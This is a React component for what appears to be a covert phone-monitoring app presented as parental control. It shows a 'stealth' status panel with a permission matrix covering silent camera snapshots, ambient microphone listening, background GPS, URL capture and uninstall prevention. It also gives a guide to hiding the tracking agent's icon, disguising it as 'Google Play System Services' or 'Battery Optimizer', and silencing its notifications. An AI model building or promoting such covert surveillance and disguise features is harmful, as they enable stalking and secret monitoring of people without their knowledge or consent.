import React from 'react';
import { ChildDeviceState } from '../types';
import { 
  EyeOff, 
  ShieldCheck, 
  CheckCircle2, 
  XCircle,
  Smartphone, 
  Lock, 
  Settings,
  HelpCircle,
  Eye,
  Info,
  Layers
} from 'lucide-react';

interface StealthStatusViewProps {
  stealthSettings: ChildDeviceState['stealthSettings'];
  childName: string;
  onOpenSetupGuide: () => void;
}

export const StealthStatusView: React.FC<StealthStatusViewProps> = ({
  stealthSettings,
  childName,
  onOpenSetupGuide
}) => {
  const permissionsList = [
    { key: 'location', label: 'Background GPS Tracking', desc: 'Allows live location updates in background' },
    { key: 'camera', label: 'Stealth Camera Access', desc: 'Captures silent front/rear snapshots' },
    { key: 'microphone', label: 'Microphone & Ambient Voice', desc: 'Enables real-time ambient listening' },
    { key: 'storage', label: 'File System & Media Indexer', desc: 'Monitors photos, audio, and documents' },
    { key: 'accessibility', label: 'Accessibility Daemon Service', desc: 'Detects active URLs and screen titles' },
    { key: 'deviceAdmin', label: 'Device Administrator Shield', desc: 'Prevents unauthorized uninstallation' },
    { key: 'usageStats', label: 'Usage Stats Permission', desc: 'Tracks active app time and locks apps' },
    { key: 'drawOverApps', label: 'Draw Over Other Applications', desc: 'Enforces fullscreen lock screen overlay' }
  ];

  return (
    <div className="grid grid-cols-1 lg:grid-cols-12 gap-6 items-start">
      
      {/* Left Column: Stealth Indicators & Hiding Guide (7 cols) */}
      <div className="lg:col-span-7 bg-white border border-slate-200 rounded-2xl p-5 shadow-xs space-y-5">
        
        <div className="flex items-center justify-between border-b border-slate-100 pb-4">
          <div className="flex items-center gap-2.5">
            <div className="p-2 rounded-xl bg-orange-100 text-orange-600 border border-orange-200">
              <EyeOff className="w-4 h-4" />
            </div>
            <div>
              <h2 className="text-sm font-bold text-slate-900">Stealth Operation & App Disguise</h2>
              <p className="text-xs text-slate-500">
                Silent Monitoring Configuration for <span className="text-slate-800 font-semibold">{childName}'s Phone</span>
              </p>
            </div>
          </div>

          <span className="px-3 py-1 rounded-full bg-emerald-50 text-emerald-700 border border-emerald-200 text-xs font-bold flex items-center gap-1.5 font-mono">
            <span className="w-2 h-2 rounded-full bg-emerald-500 animate-pulse" />
            STEALTH DAEMON RUNNING
          </span>
        </div>

        {/* Hiding Guide Manual */}
        <div className="space-y-3">
          <h3 className="font-bold text-sm text-slate-900 flex items-center gap-2">
            <Info className="w-4 h-4 text-orange-500" />
            <span>How to keep the tracking agent invisible on physical Android phones</span>
          </h3>

          <div className="text-xs text-slate-600 space-y-3 leading-relaxed">
            <div className="p-3.5 bg-slate-50 rounded-2xl border border-slate-200 space-y-1.5">
              <span className="font-bold text-slate-900 block text-xs">1. Native Android "Hide Apps" Setting:</span>
              <p className="text-slate-600">
                Go to <b>Settings &gt; Home Screen &gt; Hide Apps</b> on Samsung/Xiaomi/Oppo phones. Select the Guardian app to hide its icon completely from the launcher app drawer.
              </p>
            </div>

            <div className="p-3.5 bg-slate-50 rounded-2xl border border-slate-200 space-y-1.5">
              <span className="font-bold text-slate-900 block text-xs">2. App Disguise as "System Service":</span>
              <p className="text-slate-600">
                The agent can disguise itself with a generic system gear icon titled <b>"Google Play System Services"</b> or <b>"Battery Optimizer"</b>.
              </p>
            </div>

            <div className="p-3.5 bg-slate-50 rounded-2xl border border-slate-200 space-y-1.5">
              <span className="font-bold text-slate-900 block text-xs">3. Disable Foreground Notification Banners:</span>
              <p className="text-slate-600">
                Under <b>Settings &gt; Apps &gt; Guardian Shield &gt; Notifications</b>, turn off notifications to run silently in the background without system tray icons.
              </p>
            </div>
          </div>

          <button
            onClick={onOpenSetupGuide}
            className="w-full py-2.5 bg-slate-100 hover:bg-slate-200 text-slate-800 font-bold text-xs rounded-xl transition-colors flex items-center justify-center gap-2 border border-slate-200"
          >
            <Layers className="w-4 h-4 text-orange-600" />
            <span>Open Android Native APK Build & Stealth Guide</span>
          </button>
        </div>

      </div>

      {/* Right Column: Permission Matrix Status (5 cols) */}
      <div className="lg:col-span-5 space-y-6">
        
        <div className="bg-white border border-slate-200 rounded-2xl p-5 shadow-xs space-y-4">
          <div className="flex items-center justify-between border-b border-slate-100 pb-3">
            <div className="flex items-center gap-2">
              <Lock className="w-4 h-4 text-orange-600" />
              <h3 className="font-bold text-sm text-slate-900">Device Permission Matrix</h3>
            </div>
          </div>

          <div className="space-y-2">
            {permissionsList.map((item) => {
              const isGranted = (stealthSettings?.permissionsGranted as any)?.[item.key] ?? true;
              return (
                <div 
                  key={item.key} 
                  className="p-3 bg-slate-50 rounded-xl border border-slate-200 flex items-center justify-between gap-2 text-xs"
                >
                  <div>
                    <h4 className="font-bold text-slate-800">{item.label}</h4>
                    <p className="text-[10px] text-slate-500 mt-0.5">{item.desc}</p>
                  </div>
                  <span className={`px-2 py-0.5 rounded-full text-[10px] font-bold font-mono ${
                    isGranted 
                      ? 'bg-emerald-50 text-emerald-700 border border-emerald-200' 
                      : 'bg-red-50 text-red-700 border border-red-200'
                  }`}>
                    {isGranted ? 'GRANTED' : 'DENIED'}
                  </span>
                </div>
              );
            })}
          </div>
        </div>

      </div>

    </div>
  );
};
